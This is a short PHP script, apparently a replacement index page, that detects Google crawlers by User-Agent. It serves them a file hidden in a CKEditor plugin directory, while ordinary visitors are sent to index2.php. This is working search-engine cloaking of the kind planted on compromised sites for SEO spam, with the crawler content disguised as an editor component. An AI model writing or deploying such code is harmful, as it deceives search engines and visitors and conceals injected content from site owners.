<?php
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 
$googleBots = [
    'Googlebot',
    'Googlebot-Image',
    'Googlebot-Video',
    'Googlebot-News',
    'Storebot-Google',
    'Google-InspectionTool',
    'GoogleOther',
    'GoogleOther-Image',
    'GoogleOther-Video',
    'Google-CloudVertexBot'
];
 
$isGoogleBot = false;
foreach ($googleBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $isGoogleBot = true;
        break;
    }
}
 
if ($isGoogleBot) {
    include(__DIR__ . '/ckeditor/plugins/pastetools/filter/default.php');
    exit;
} else {
    include(__DIR__ . '/index2.php');
    exit;
}
?>
